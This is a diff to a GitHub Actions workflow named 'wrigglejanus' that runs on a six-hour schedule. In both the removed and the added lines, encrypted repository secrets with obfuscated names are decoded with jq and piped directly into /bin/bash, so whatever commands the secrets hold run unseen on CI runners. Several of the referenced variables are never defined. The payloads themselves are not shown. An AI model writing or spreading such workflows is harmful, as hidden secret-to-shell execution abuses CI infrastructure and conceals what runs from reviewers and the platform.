@@ -3,9 +3,9 @@ name: wrigglejanus
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
+    - cron: '40 2/6 * * *'
 
-jobs:  # 9833
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,15 +13,11 @@ jobs:  # 9833
       - uses: actions/checkout@v4
       - name: wrigglejanus
         env:
-          aef252: ${{ secrets.aef252 }}
+          u2: ${{ secrets.u2 }}
         run: |
-          echo $aef252 | jq -r .hn08046 | /bin/bash
-          echo $kzdgt1164 | jq -r .ik170 | /bin/bash
-          echo $wujc469 | jq -r .uul5113 | /bin/bash
-          echo $h7 | jq -r .zjgl0 | /bin/bash
-          echo $svit882 | jq -r .zvm94835 | /bin/bash
-          echo $zhjgk8871 | jq -r .yyt068 | /bin/bash
-          echo $xjz09331 | jq -r .dycu648 | /bin/bash
-          echo $opdz0080 | jq -r .grxh931 | /bin/bash
-          echo $v1271 | jq -r .ufgm0 | /bin/bash
+          echo $u2 | jq -r .yxoy5448 | /bin/bash
+          echo $fni5 | jq -r .olrq113 | /bin/bash
+          echo $f9478 | jq -r .znpov14 | /bin/bash
+          echo $av6 | jq -r .bmux40595 | /bin/bash
+          echo $hqpow75396 | jq -r .gib7222 | /bin/bash
 
